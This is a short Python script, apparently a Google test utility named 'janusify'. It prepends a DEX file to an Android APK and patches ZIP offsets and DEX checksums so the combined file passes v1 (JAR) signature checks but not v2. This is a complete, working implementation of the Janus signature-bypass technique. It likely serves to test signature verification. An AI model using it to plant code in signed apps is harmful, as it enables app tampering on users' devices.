#!/usr/bin/env python3
# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

# Prepends a DEX file to an APK file and updates internal data structures of
# each to make them pass basic validation.
#
# The resulting APK will pass APK signature V1 / JAR signature checks but will
# not pass APK V2 signature checks.

import hashlib
import os
import struct
import sys
import zlib

if len(sys.argv) != 4:
    print("usage: janusify [DEX] [APK] [OUT]")
    exit(1)

dex_path = sys.argv[1]
in_apk_path = sys.argv[2]
out_apk_path = sys.argv[3]

def sha1(message):
    m = hashlib.sha1()
    m.update(message)
    return m.digest()

with open(dex_path, 'rb') as dex_file, open(in_apk_path, 'rb') as in_apk_file:
    dex_data = dex_file.read()
    dex_data_len = len(dex_data)
    data = in_apk_file.read()

    def read_short(offset):
        global data
        return struct.unpack('<H', data[offset : offset + 2])[0]

    def read_int(offset):
        global data
        return struct.unpack('<L', data[offset : offset + 4])[0]

    def write_int(offset, value):
        global data
        data = (
                data[0 : offset] +
                struct.pack('<L', value) +
                data[offset + 4:])

    def write_bytes(offset, value):
        global data
        data = data[0 : offset] + value + data[offset + len(value):]

    def adjust_offset(offset):
        """
        Adjust a ZIP file offset value to account for the newly prepended
        DEX file data.
        """
        x = read_int(offset)
        write_int(offset, x + dex_data_len)

    # Step 1. Find the end-of-central-directory record. Do this by looking for
    # the last instance of the header magic. Not 100% perfect because of
    # comments etc but good enough.
    eocd = 0
    for i in range(len(data) - 4, -1, -1):
        if read_int(i) == 0x06054b50:
            eocd = i
            break

    if eocd == 0:
        print('[!] Cannot find end-of-central-directory!')
        exit(1)

    print('[+] Found end-of-central-directory record at offset {}.'.format(eocd))

    cd_start = read_int(eocd + 16)
    cd_count_expected = read_short(eocd + 10)

    # Step 2. Adjust the end-of-central-directory offset to the start of the
    # central directory.
    adjust_offset(eocd + 16)

    # Step 3. Scan through the central directory records and adjust each each
    # offset.
    cd_count_actual = 0
    while True:
        if read_int(cd_start) != 0x02014b50:
            break
        file_name_length = read_short(cd_start + 28)
        extra_field_length = read_short(cd_start + 30)
        comment_length = read_short(cd_start + 32)
        adjust_offset(cd_start + 42)
        cd_start += 46 + file_name_length + extra_field_length + comment_length
        cd_count_actual += 1

    if cd_count_actual != cd_count_expected:
        print('[!] Only adjusted {} records but expected {}!'.format(
            cd_count_actual, cd_count_expected))
        exit(1)

    print('[+] Adjusted {} central directory records.'.format(cd_count_actual))

    print('[+] Fixing up combined data.')

    data = dex_data + data

    adler_start = 8
    sha1_start = 8 + 4
    file_length_start = sha1_start + 20
    write_int(file_length_start, len(data))
    write_bytes(sha1_start, sha1(data[file_length_start:]))
    write_int(adler_start, zlib.adler32(data[sha1_start:]))

    with open(out_apk_path, 'wb') as out_apk_file:
        out_apk_file.write(data)
    print('[+] Adjusted APK written to {}.'.format(out_apk_path))
